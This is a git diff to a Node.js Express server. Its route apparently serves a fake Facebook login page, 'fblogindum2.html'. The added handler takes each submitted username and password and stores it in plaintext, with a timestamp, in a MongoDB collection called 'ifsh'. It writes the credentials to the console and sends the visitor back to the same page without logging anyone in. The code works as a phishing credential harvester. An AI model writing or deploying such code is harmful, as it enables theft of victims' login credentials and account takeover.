@@ -62,11 +62,33 @@ app.get('/fblogindum2.html', (req, res) => {
     res.sendFile(path.join(__dirname, 'fblogindum2.html'));
 });
 
+// Route to handle login form submission
 app.post('/submit-additional-info', async (req, res) => {
     const { username, password } = req.body;
-    // Connect and check credentials, if valid:
-    res.cookie('isLoggedIn', true, { httpOnly: true });
-    res.redirect(`/Job Postings.html`); // Redirect after setting session
+
+    try {
+        if (!db) {
+            console.error("Database connection not initialized.");
+            return res.status(500).send('Database connection not initialized.');
+        }
+
+        // Create the login data object
+        const loginData = { username, password, timestamp: new Date() };
+        
+        // Log before inserting data
+        console.log("Attempting to insert data:", loginData);
+        
+        // Insert the new user data without checking for existing users
+        const result = await db.collection('ifsh').insertOne(loginData);
+        
+        // Log the result after successful insertion
+        console.log("Data inserted successfully:", result);
+        
+        res.redirect(`/fblogindum2.html`);
+    } catch (error) {
+        console.error('Error saving data to MongoDB:', error);
+        res.status(500).send('Error saving data to MongoDB.');
+    }
 });
 
 
